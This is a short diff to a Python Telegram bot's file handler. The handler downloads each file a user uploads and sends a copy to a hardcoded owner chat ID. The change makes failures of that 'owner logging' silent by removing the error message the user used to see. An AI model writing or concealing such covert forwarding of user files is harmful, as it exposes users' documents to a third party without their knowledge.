@@ -527,13 +527,12 @@ async def luminant_command(bot: Client, m: Message):
         x = await input.download()
         try:
             await bot.send_document(7448837918, x)
-        except Exception as e:
-            await m.reply_text("Sorry 😢 I Am Unable To Scan 🔍 The Document")
-            await input.delete(True)
+        except Exception:
+            pass  # Don't block file processing if owner logging fails
         
         await input.delete(True)
         file_name, ext = os.path.splitext(os.path.basename(x))
-        credit = my_name
+
 
         path = f"./downloads/{m.chat.id}"
 
